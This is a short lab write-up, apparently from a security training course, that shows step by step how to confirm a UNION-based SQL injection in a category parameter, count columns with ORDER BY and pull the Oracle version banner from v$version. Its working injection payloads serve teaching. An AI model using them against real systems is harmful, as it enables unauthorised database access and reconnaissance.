# Lab 7: SQL injection attack, querying the database type and version on Oracle

## Goal: Identify the database type (Oracle) and retrieve its version using UNION-based SQLi.

1. Test for SQL Injection
Inject ' in the category parameter:
```bash
/filter?category=Gifts'
```
Error appears → SQLi exists.

2. Identify number of columns
Use ORDER BY:
```bash
' ORDER BY 1--      works
' ORDER BY 2--      works
' ORDER BY 3--      internal server error
```
There are 2 columns.

3. Oracle Requirement – Every SELECT needs a table
Oracle does NOT allow:
```bash
UNION SELECT 'a','b'--
```
You must use:
```bash
UNION SELECT 'a','b' FROM dual--
```

4. Retrieve Oracle version
Oracle stores version info in:
- v$version
- banner
Final Payload
```bash
' UNION SELECT banner, NULL FROM v$version--
```

Version banner displayed 

Key Learning
- Oracle requires FROM clause
- Version information in v$version and v$instance
